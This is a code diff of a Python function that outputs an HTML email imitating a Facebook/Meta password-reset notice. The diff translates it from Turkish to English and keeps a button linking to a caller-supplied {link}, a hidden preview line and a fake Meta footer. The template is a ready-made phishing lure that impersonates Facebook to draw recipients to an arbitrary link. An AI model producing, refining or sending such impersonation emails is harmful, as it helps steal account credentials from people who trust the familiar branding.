@@ -20,7 +20,7 @@ def get_html_content(link):
                                                                 </tr>
                                                                 <tr>
                                                                     <td height="1" colspan="3" style="line-height:1px">
-                                                                        <span style="color:#ffffff;font-size:1px;opacity:0">Facebook şifrenizi yenilemek için bir talep aldık.</span>
+                                                                        <span style="color:#ffffff;font-size:1px;opacity:0">We received a request to reset your Facebook password.</span>
                                                                     </td>
                                                                 </tr>
                                                                 <tr>
@@ -42,22 +42,22 @@ def get_html_content(link):
                                                                                 </tr>
                                                                             </tbody>
                                                                         </table>
-                                                                        <div style="margin-top:16px;margin-bottom:20px;font-size:18px">Merhaba,</div>
+                                                                        <div style="margin-top:16px;margin-bottom:20px;font-size:18px">Hello,</div>
                                                                         <div style="border-bottom:solid 1px #e5e5e5;margin-bottom:20px"></div>
-                                                                        <p style="font-size:16px">Şifrenizi doğrudan değiştirebilirsiniz.</p>
+                                                                        <p style="font-size:16px">You can change your password directly.</p>
                                                                         <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                                                                             <tbody>
                                                                                 <tr>
                                                                                     <td style="background:#1877f2;border-radius:6px;text-align:center;padding:12px 20px">
-                                                                                        <a href="{link}" style="color:#fff;text-decoration:none;font-family:Roboto,sans-serif;font-size:17px;font-weight:500;display:block;width:100%">Şifreyi Değiştir</a>
+                                                                                        <a href="{link}" style="color:#fff;text-decoration:none;font-family:Roboto,sans-serif;font-size:17px;font-weight:500;display:block;width:100%">Change Password</a>
                                                                                     </td>
                                                                                 </tr>
                                                                             </tbody>
                                                                         </table>
                                                                         <div style="margin-top:20px">
-                                                                            <span style="color:#333333;font-weight:bold">Böyle bir istekte bulunmadınız mı?</span>
+                                                                            <span style="color:#333333;font-weight:bold">Didn't request this change?</span>
                                                                         </div>
-                                                                        <p>Yeni bir şifre isteğinde bulunmadıysanız, <a href="#" style="color:#0a7cff;text-decoration:none">bize bildirin</a>.</p>
+                                                                        <p>If you didn't request a new password, please <a href="#" style="color:#0a7cff;text-decoration:none">let us know</a>.</p>
                                                                     </td>
                                                                     <td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td>
                                                                 </tr>
@@ -70,8 +70,8 @@ def get_html_content(link):
                                                                         <div style="margin-bottom:10px;color:#84878b">from</div>
                                                                         <img width="74" alt="Meta" height="22" src="https://facebook.com/images/email/meta_logo.png" style="border:0;margin-bottom:10px">
                                                                         <br>© Facebook. Meta Platforms, Inc., Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025
-                                                                        <br><br>Bu mesaj <a style="color:#1b74e4;text-decoration:none" href="mailto:burakpekisik@gmail.com">burakpekisik@gmail.com</a> adresine gönderilmiştir.
-                                                                        <br>Hesabınızı güvende tutabilmek için lütfen bu e-postayı iletmeyin.
+                                                                        <br><br>This message was sent to secure file transfer recipients.
+                                                                        <br>Please do not forward this email to keep your account secure.
                                                                     </td>
                                                                 </tr>
                                                             </tbody>
